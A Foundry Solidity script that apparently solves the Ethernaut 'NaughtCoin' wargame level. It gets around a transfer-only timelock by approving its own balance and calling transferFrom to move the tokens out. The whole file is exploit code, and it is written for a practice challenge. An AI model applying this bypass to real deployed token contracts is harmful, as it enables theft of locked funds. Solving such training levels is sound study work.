// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level15.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract NaughtCoinSolution is Script {
    NaughtCoin public naughtCoin =
        NaughtCoin(0x5c27c223b70ab7A63073FAd8517C34b8a04cD3c1);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint256 beforeBal = naughtCoin.balanceOf(
            0xBD008DB3d8704Ce124fcd13E448E950B409e07E1
        );
        naughtCoin.approve(
            0xBD008DB3d8704Ce124fcd13E448E950B409e07E1,
            beforeBal
        );
        naughtCoin.transferFrom(
            0xBD008DB3d8704Ce124fcd13E448E950B409e07E1,
            address(naughtCoin),
            beforeBal
        );
        naughtCoin.balanceOf(0xBD008DB3d8704Ce124fcd13E448E950B409e07E1);

        vm.stopBroadcast();
    }
}
